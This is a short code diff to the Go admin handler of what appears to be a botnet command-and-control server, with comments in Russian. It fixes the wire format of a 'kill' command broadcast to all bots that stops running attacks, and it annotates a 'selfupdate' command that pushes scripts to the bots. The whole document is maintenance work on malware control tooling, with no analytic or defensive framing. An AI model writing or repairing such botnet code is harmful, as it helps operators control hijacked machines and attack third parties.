@@ -266,8 +266,8 @@ func (this *Admin) Handle() {
 
 		if cmd == "stop" {
 			this.conn.Write([]byte("Stopping all attacks...\r\n"))
-			// отправляем kill команду всем ботам
-			killCmd := []byte{0x00, 0x00, 0x03}
+			// отправляем kill команду всем ботам (правильный формат протокола)
+			killCmd := []byte{0x00, 0x01, 0x03} // length=1, command=0x03
 			clientList.QueueBuf(killCmd, -1, "")
 			this.conn.Write([]byte("All attacks stopped\r\n"))
 			continue
@@ -498,9 +498,10 @@ func (this *Admin) Handle() {
 				continue
 			}
 
+			// формат: [length 2 bytes] [command 1 byte] [script_len 2 bytes] [script]
 			buf := make([]byte, 0, len(script)+10)
-			buf = append(buf, 0x00, 0x00)
-			buf = append(buf, 0x01)
+			buf = append(buf, 0x00, 0x00) // placeholder для длины
+			buf = append(buf, 0x01) // команда selfupdate
 			scriptLen := uint16(len(script))
 			buf = append(buf, byte(scriptLen>>8), byte(scriptLen&0xFF))
 			buf = append(buf, []byte(script)...)
